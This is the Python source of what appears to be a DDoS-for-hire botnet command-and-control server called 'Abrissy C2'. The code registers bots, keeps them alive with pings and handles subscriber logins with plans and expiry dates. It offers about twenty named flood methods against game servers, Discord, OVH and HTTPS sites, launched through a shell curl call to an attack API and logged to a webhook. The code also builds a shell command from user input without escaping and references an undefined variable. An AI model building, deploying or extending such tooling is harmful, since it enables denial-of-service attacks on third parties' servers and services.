
import socket
import threading
import sys
import time
import ipaddress
from colorama import Fore, init
import subprocess
from datetime import datetime, timedelta
from colorama import init, Fore, Style, Back
import requests
max_time = 0
expiry_date = 0
days_left = 000
cons = 0
c_username = "abc"
c_vip = "abc"
c_ban = "abc"
c_admin = 'abc'
cooldown = 0

ansi_clear = '\033[2J\033[H'
def rgb_to_colorama(r, g, b):
    return f'\x1b[38;2;{r};{g};{b}m'

def generate_gradient_text(text, start_color, end_color):
    gradient_text = ""
    text_length = len(text)
    
    for i in range(text_length):
        ratio = i / (text_length - 1)
        r = int(start_color[0] * (1 - ratio) + end_color[0] * ratio)
        g = int(start_color[1] * (1 - ratio) + end_color[1] * ratio)
        b = int(start_color[2] * (1 - ratio) + end_color[2] * ratio)
        
        gradient_text += rgb_to_colorama(r, g, b) + text[i]
    
    return gradient_text

start_color = (255, 105, 180)  
end_color = (255, 255, 255)   

banner = generate_gradient_text(f"""
 Welcome to CNC
""", start_color, end_color)
banner2 = f"""              
"""
def validate_port(port, rand=False):
    if rand:
        return port.isdigit() and int(port) >= 0 and int(port) <= 65535
    else:
        return port.isdigit() and int(port) >= 1 and int(port) <= 65535

def validate_time(time):
    return time.isdigit() and int(time) >= 10 and int(time) <= max_time
def validate_size(size):
    return size.isdigit() and int(size) > 1 and int(size) <= 65500

def find_login(username, password):
    global max_time
    global days_left
    global cons
    global c_username
    global expiry_date
    global c_vip 
    global c_ban
    global c_admin
    global cooldown
    credentials = [x.strip() for x in open('logins.txt').readlines() if x.strip()]
    for x in credentials:
        try:
            c_username, c_password, max_time_str, expiry_date_str, cons_str, c_vip, c_admin, cooldown_str, c_ban = x.split(':')
            max_time = int(max_time_str)
            cons = int(cons_str)
            expiry_date = datetime.strptime(expiry_date_str, "%Y-%m-%d")
            cooldown = int(cooldown_str)
            if c_username.lower() == username.lower() and c_password == password:
                current_date = datetime.now()
                days_left = (expiry_date - current_date).days
                if current_date > expiry_date:
                    return False 

                return True
        except ValueError:
            continue
    return False


def send(socket, data, escape=True, reset=True):
    if reset:
        data += Fore.RESET
    if escape:
        data += '\r\n'
    socket.send(data.encode())

def broadcast(method, ip, port, time):
    for bot in bots.keys():
        try:
            send(client, 'HELP: Shows list of commands')
        except:
            bots.pop(bot)
            bot.close()

def ping():
    while 1:
        dead_bots = []
        for bot in bots.keys():
            try:
                bot.settimeout(3)
                send(bot, 'PING', False, False)
                if bot.recv(1024).decode() != 'PONG':
                    dead_bots.append(bot)
            except:
                dead_bots.append(bot)
        for bot in dead_bots:
            bots.pop(bot)
            bot.close()
        time.sleep(5)
def is_edu_gov_domain(url):
    forbidden_domains = ['.gov', '.edu', '.gov.pl', '.edu.pl']
    return any(domain in url for domain in forbidden_domains)
def update_ban_status(username, new_status, filename):
    # Otwórz plik do odczytu
    with open(filename, 'r') as file:
        lines = file.readlines()  
    with open(filename, 'w') as file:
        for line in lines:
            parts = line.strip().split(':')
            if parts[0] == username:
                parts[-1] = new_status  
            file.write(':'.join(parts) + '\n')  # 
def update_title(client, username, max_time, days_left):
    while 1:
        try:
            send(client, f'\33]0;Abrissy | Connected as: [ {username} ] | Max time: [ {max_time}s ] | Expiry: [ {days_left} days ]\a', False)
            time.sleep(2)
        except:
            client.close()
def check_username_in_file(c_username, file_path):
    try:
        
        with open(file_path, 'r') as file:
        
            for line in file:
                if c_username in line:
                    print("No enough concurrents!")
                    return False
    
        return True
    except FileNotFoundError:
        print(f"File {file_path} not found.")
        return False

def run_python_script(username, secs):
    subprocess.run(['python', 'conc.py', username, str(secs)], check=True)

def command_line(client, c_username, max_time, days_left, cons, c_vip, c_admin, expiry_date, cooldown, c_ban):
    for x in banner.split('\n'):
        send(client, x)
    for x2 in banner2.split('\n'):
        send(client, x2)
    prompt = generate_gradient_text(f"{c_username} • AbrissyC2 ►► ", start_color, end_color)
    send(client, prompt, False)

    while 1:
        try:
            data = client.recv(1024).decode().strip()
            if not data:
                continue

            args = data.split(' ')
            command = args[0].upper()
            line1 = f'{Fore.LIGHTMAGENTA_EX}┌──────────────────────┬───────────────────────┐{Fore.LIGHTWHITE_EX}'
            line2 = f'{Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX} Layer 4              {Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX} Layer 7               {Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX}'
            line3 = f'{Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX}                      {Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX}                       {Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX}'
            line4 = f'{Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX}  • HOME              {Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX} • TLS                 {Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX}'
            line5 = f'{Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX}  • UDP               {Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX} • RAPIDRESET          {Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX}'
            line6 = f'{Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX}  • UDP-VSE           {Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX} • RESET               {Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX}'
            line7 = f'{Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX}  • TCP-TFO           {Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX} • BROWSER             {Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX}'
            line8 = f'{Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX}  • DISCORD           {Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX} • TLSKILL             {Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX}'
            line9 = f'{Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX}  • GAME              {Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX} • HTTP-DDOS           {Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX}'
            line10 = f'{Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX}  • TCP-MIX           {Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX}                       {Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX}'
            line11 = f'{Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX}  • TCP-SYN           {Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX}                       {Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX}'
            line12 = f'{Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX}  • UDPBYPASS         {Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX}                       {Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX}'
            line13 = f'{Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX}  • OVH               {Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX}                       {Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX}'
            line14 = f'{Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX}  • GAME-R6           {Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX}                       {Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX}'
            line15 = f'{Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX}  • HANDSHAKE         {Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX}                       {Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX}'
            line16 = f'{Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX}  • DNS               {Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX}                       {Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX}'
            line17 = f'{Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX}  • UDPPLAIN          {Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX}                       {Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX}'
            line18 = f'{Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX}  • TCP-ACK           {Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX}                       {Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX}'
            line19 = f'{Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX}  • TCPLEGIT          {Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX}                       {Fore.LIGHTMAGENTA_EX}│{Fore.LIGHTWHITE_EX}'
            line20 = f'{Fore.LIGHTMAGENTA_EX}│                      │                       │{Fore.LIGHTWHITE_EX}'
            line21 = f'{Fore.LIGHTMAGENTA_EX}│                      │                       │{Fore.LIGHTWHITE_EX}'
            line22 = f'{Fore.LIGHTMAGENTA_EX}└──────────────────────┴───────────────────────┘{Fore.LIGHTWHITE_EX}'

            if command == 'HELP':
                send(client, f'• <METHOD>       ► {Fore.LIGHTBLACK_EX}Start attack{Fore.LIGHTWHITE_EX}')
                send(client, f'• HELP           ► {Fore.LIGHTBLACK_EX}Get command list{Fore.LIGHTWHITE_EX}')
                send(client, f'• METHODS        ► {Fore.LIGHTBLACK_EX}Get methods list{Fore.LIGHTWHITE_EX}')
                send(client, f'• PLAN           ► {Fore.LIGHTBLACK_EX}Get info about your plan{Fore.LIGHTWHITE_EX}')
                send(client, f'• LOGOUT         ► {Fore.LIGHTBLACK_EX}Logout from session{Fore.LIGHTWHITE_EX}')
                send(client, f'• CLEAR          ► {Fore.LIGHTBLACK_EX}Clear terminal{Fore.LIGHTWHITE_EX}')
                send(client, f'• STATUS         ► {Fore.LIGHTBLACK_EX}Check servers status{Fore.LIGHTWHITE_EX}')
            elif command == 'METHODS':
                send(client, '┌────────────────────────────────────────────────────────────────────┐')
                send(client, '│ [ Layer 4 Methods ]                                                │')
                send(client, f'│ {Fore.LIGHTMAGENTA_EX}DNS{Fore.LIGHTWHITE_EX}              - UDP flood mixed with amps.                      │')
                send(client, f'│ {Fore.LIGHTMAGENTA_EX}SOCKET{Fore.LIGHTWHITE_EX}           - TCP socket flood, high cps.                     │')
                send(client, f'│ {Fore.LIGHTMAGENTA_EX}OVH{Fore.LIGHTWHITE_EX}              - Simple ovh handshake flood.                     │')
                send(client, f'│ {Fore.LIGHTMAGENTA_EX}UDP-VSE{Fore.LIGHTWHITE_EX}          - Overwhelms servers via UDP.                     │')
                send(client, f'│ {Fore.LIGHTMAGENTA_EX}UDP-TFO{Fore.LIGHTWHITE_EX}          - TCP Fast Open overload.                         │')
                send(client, f'│ {Fore.LIGHTMAGENTA_EX}DISCORD{Fore.LIGHTWHITE_EX}          - Discord bypass voice channel flood.             │')
                send(client, f'│ {Fore.LIGHTMAGENTA_EX}GAME{Fore.LIGHTWHITE_EX}             - TCP & UDP flood optimized to game servers       │')
                send(client, f'│ {Fore.LIGHTMAGENTA_EX}TCP-MIX{Fore.LIGHTWHITE_EX}          - TCP mixed flood.                                │')
                send(client, f'│ {Fore.LIGHTMAGENTA_EX}TCP-SYN{Fore.LIGHTWHITE_EX}          - Floods server with fake connection requests.    │')
                send(client, f'│ {Fore.LIGHTMAGENTA_EX}UDPBYPASS{Fore.LIGHTWHITE_EX}        - UDP bypass flood.                               │')
                send(client, f'│ {Fore.LIGHTMAGENTA_EX}GAME-R6{Fore.LIGHTWHITE_EX}          - TCP & UDP flood optimized to game servers       │')
                send(client, f'│ {Fore.LIGHTMAGENTA_EX}HANDSHAKE{Fore.LIGHTWHITE_EX}        - TCP Handshake flood.                            │')
                send(client, f'│ {Fore.LIGHTMAGENTA_EX}UDPPLAIN{Fore.LIGHTWHITE_EX}         - UDP Plain flood.                                │')
                send(client, f'│ {Fore.LIGHTMAGENTA_EX}TCP-ACK{Fore.LIGHTWHITE_EX}          - Overwhelms server with fake ACK packets.        │')
                send(client, f'│ {Fore.LIGHTMAGENTA_EX}TCPLEGIT{Fore.LIGHTWHITE_EX}         - Legit tcp packets flood.                        │')
                send(client, '│ [ Layer 7 Methods ]                                                │')
                send(client, f'│ {Fore.LIGHTMAGENTA_EX}TLSKILL{Fore.LIGHTWHITE_EX}          - HTTPS flood optimized for High RPS.             │')
                send(client, f'│ {Fore.LIGHTMAGENTA_EX}HTTP-DDOS{Fore.LIGHTWHITE_EX}        - Chrome flood for bypassing captcha.             │')
                send(client, f'│ {Fore.LIGHTMAGENTA_EX}TLS{Fore.LIGHTWHITE_EX}              - High request per second flood.                  │')
                send(client, f'│ {Fore.LIGHTMAGENTA_EX}RAPIDRESET{Fore.LIGHTWHITE_EX}       - HTTP flood for bypassing http-ddos.             │')
                send(client, f'│ {Fore.LIGHTMAGENTA_EX}RESET{Fore.LIGHTWHITE_EX}            - Simple http DDoS attack.                        │')
                send(client, f'│ {Fore.LIGHTMAGENTA_EX}BROWSER{Fore.LIGHTWHITE_EX}          - Browser HTTPS attack.                           │')
                send(client, '└────────────────────────────────────────────────────────────────────┘')
            elif command == 'USERADD':
                if c_admin == 'True':
                    if len(args) == 8:  
                        user = args[1]
                        pass1 = args[2]
                        mtime = args[3]
                        cons1 = args[4]
                        expir = args[5]
                        vip_t_f = args[6]
                        cdown = args[6]
                        subprocess.run(f"echo {user}:{pass1}:{mtime}:{expir}:{cons1}:{vip_t_f}:False:{cdown}:False >> logins.txt", shell=True, check=True)
                    else:
                        send(client, 'useradd <user> <password> <maxtime> <cons> <expiry YYYY-MM-DD> <vip True/False> <cooldown in s>')
                else: 
                    send(client, Fore.RED + 'Your permissions are too low to do that!')
            elif command == 'BAN':
                if c_admin == 'True':
                    if len(args) == 2:  
                        user = args[1]

                        update_ban_status(f'{user}', 'True', 'logins.txt')
                        send(client, f'Banned {user}')
                    else:
                        send(client, 'ban <user>')
                else: 
                    send(client, Fore.RED + 'Your permissions are too low to do that!')

            elif command == 'UNBAN':
                if c_admin == 'True':
                    if len(args) == 2:  
                        user = args[1]

                        update_ban_status(f'{user}', 'False', 'logins.txt')
                        send(client, f'Unbanned {user}')
                    else:
                        send(client, 'unban <user>')
                else: 
                    send(client, Fore.RED + 'Your permissions are too low to do that!')

            elif command == 'PLAN':
                send(client, f'• Expiry left    ► {Fore.LIGHTBLACK_EX}{days_left} days{Fore.LIGHTWHITE_EX}')
                send(client, f'• Expiry date    ► {Fore.LIGHTBLACK_EX}{expiry_date}{Fore.LIGHTWHITE_EX}')
                send(client, f'• Max boot time  ► {Fore.LIGHTBLACK_EX}{max_time}s{Fore.LIGHTWHITE_EX}')
                send(client, f'• Username       ► {Fore.LIGHTBLACK_EX}{c_username}{Fore.LIGHTWHITE_EX}')
                send(client, f'• Banned         ► {Fore.LIGHTBLACK_EX}{c_ban}{Fore.LIGHTWHITE_EX}')
                send(client, f'• VIP            ► {Fore.LIGHTBLACK_EX}{c_vip}{Fore.LIGHTWHITE_EX}')
                send(client, f'• Concurrents    ► {Fore.LIGHTBLACK_EX}{cons}{Fore.LIGHTWHITE_EX}')
                send(client, f'• Cooldown       ► {Fore.LIGHTBLACK_EX}{cooldown}s{Fore.LIGHTWHITE_EX}')
            elif command == 'CLEAR':
                send(client, ansi_clear, False)
                for x in banner.split('\n'):
                    send(client, x)

            elif command == 'LOGOUT':
                send(client, 'Logging out!')
                time.sleep(1)
                break
            elif command == 'STATUS':
                try:
                    response = requests.get('YOUR API URL')
                    if response.status_code == 200:
                        send(client, f"Server is {Fore.GREEN}ONLINE{Fore.LIGHTWHITE_EX}")
                    else:
                        send(client, f"Server is {Fore.RED}OFFLINE{Fore.LIGHTWHITE_EX}")
                except Exception as e:
                    send(client, f"Server is {Fore.RED}OFFLINE{Fore.LIGHTWHITE_EX}")

            elif command in ['DNS', 'UDP', 'HOME', 'UDP-VSE', 'TCP-MIX', 'TCP-SYN', 'UDPBYPASS', 'OVH', 'GAME-R6', 'HANDSHAKE', 'UDPPLAIN', 'FLOODER', 'TCP-TFO', 'DISCORD', 'GAME', 'TLS', 'RAPIDRESET', 'RESET', 'BROWSER', 'TLSKILL', 'TCPLEGIT', 'HTTP-DDOS', 'TCP-ACK']:
                if len(args) == 4:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    if validate_port(port):
                        if validate_port(port):
                            if validate_time(secs):
                                attack_time = int(secs)
                                if check_username_in_file(c_username, file_path):
                                    if attack_time <= max_time:
                                        if c_ban == 'True':
                                            send(client, Fore.RED + 'Your account has been suspended.', False)
                                            send(client, Fore.RED + ' Please contact the administrator if you believe this is a mistake.', False)
                                            continue
                                            if is_edu_gov_domain(ip):
                                                curl3 = f'curl -H "Content-Type: application/json" -X POST -d "{{\\"content\\": \\"@everyone `{c_username}` attacked `{ip}`!!!\\"}}" Webhook URL'
                                                subprocess.run(curl3, shell=True)
                                                send(client, Fore.RED + 'YOU CANNOT ATTACK GOV/EDU PAGES! YOUR ACCOUNT WILL GET BANNED SOON', False)
                                                continue
                                    else:
                                        send(client, Fore.RED + f'Attack time exceeds maximum allowed time of {max_time} seconds')        
            
                                    curl = f'your api url= time={secs} method={command} port={port} host={ip} '
                                    curl2 = f'curl -H "Content-Type: application/json" -X POST -d "{{\\"content\\": \\"Attack deployed by: `{c_username}` / Host: `{ip}` / Port: `{port}` / Time: `{secs}` / Method: `{command}`\\"}}" Webhook URL'

                                    subprocess.run(curl, shell=True)
                                    subprocess.run(curl2, shell=True)
                                    send(client, f' • Status        ► {Fore.LIGHTBLACK_EX}Attack Deployed{Fore.LIGHTWHITE_EX}')           
                                    send(client, f' • Method        ► {Fore.LIGHTBLACK_EX}{command}{Fore.LIGHTWHITE_EX}')                                                      
                                    send(client, f' • Host          ► {Fore.LIGHTBLACK_EX}{ip}{Fore.LIGHTWHITE_EX}')                                            
                                    send(client, f' • Port          ► {Fore.LIGHTBLACK_EX}{port}{Fore.LIGHTWHITE_EX}')                              
                                    send(client, f' • Time          ► {Fore.LIGHTBLACK_EX}{secs}{Fore.LIGHTWHITE_EX}')
                                    send(client, '')
                                    thread = threading.Thread(target=run_python_script, args=(c_username, secs))
                                    thread.start()
                                    time.sleep(cooldown)
                                    
                                
                                else:
                                    send(client, Fore.RED + f'No enough concurrents! Your max concurrents is {cons}')
                            else:
                                send(client, Fore.RED + 'Invalid attack duration')
                        else:
                            send(client, Fore.RED + 'Invalid port number (1-65535)')
                    else:
                        send(client, Fore.RED + 'Invalid IP-address')
                else:
                    send(client, 'Usage: [METHOD] [IP for L4 / URL for L7] [PORT] [TIME]')
            else:
                send(client, Fore.RED + 'Unknown Command')

            send(client, prompt, False)
        except:
            break
    client.close()
login_start_time = datetime.now()

def handle_client(client, address):
    send(client, f'\33]0;Abrissy C2 | Login\a', False)

    while 1:
        send(client, ansi_clear, False)
        send(client, f'Username: ', False)
        username = client.recv(1024).decode().strip()
        if not username:
            continue
        break

    # password login
    password = ''
    while 1:
        send(client, ansi_clear, False)
        send(client, f'Password:{Fore.BLACK} ', False, False)
        while not password.strip():
            password = client.recv(1024).decode('cp1252').strip()
        break

    
    if password != '\xff\xff\xff\xff\75':
        send(client, ansi_clear, False)

        
        if not find_login(username, password):
            send(client, Fore.RED + 'Invalid credentials or session expired')
            time.sleep(1)
            client.close()
            return

        # Successful login
        threading.Thread(target=update_title, args=(client, username, max_time, days_left)).start()
        threading.Thread(target=command_line, args=(client, c_username, max_time, days_left, cons, c_vip, c_admin, expiry_date, cooldown, c_ban)).start()

    # handle bot
    else:
        # Check if bot is already connected
        for x in bots.values():
            if x[0] == address[0]:
                client.close()
                return
        bots.update({client: address})

def main():
    if len(sys.argv) != 2:
        print(f'Usage: python {sys.argv[0]} <c2 port>')
        exit()

    port = sys.argv[1]
    if not port.isdigit() or int(port) < 1 or int(port) > 65535:
        print('Invalid C2 port')
        exit()
    port = int(port)

    init(convert=True)

    sock = socket.socket()
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        sock.bind(('0.0.0.0', port))
    except:
        print('Failed to bind port')
        exit()

    sock.listen()

    threading.Thread(target=ping).start()  # start keepalive thread

    # accept all connections
    while 1:
        threading.Thread(target=handle_client, args=[*sock.accept()]).start()

if __name__ == '__main__':
    main()
